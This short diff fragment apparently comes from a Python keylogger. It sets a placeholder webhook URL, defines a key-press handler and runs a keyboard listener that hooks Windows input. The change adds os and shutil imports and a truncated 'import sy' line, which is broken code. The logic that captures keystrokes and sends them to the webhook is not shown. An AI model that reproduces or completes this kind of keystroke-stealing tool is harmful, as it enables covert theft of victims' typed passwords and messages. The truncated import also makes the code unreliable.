@@ -3,6 +3,9 @@ import requests
 import json
 import win32gui
 import win32con
+import os
+import shutil
+import sy
 
 #this stuff is just needed
 webhook_url = 'your webhook goes here'
@@ -107,6 +110,7 @@ def on_press(key):
 
 with keyboard.Listener(on_press=on_press) as listener:
     listener.join()
+
 
 
 
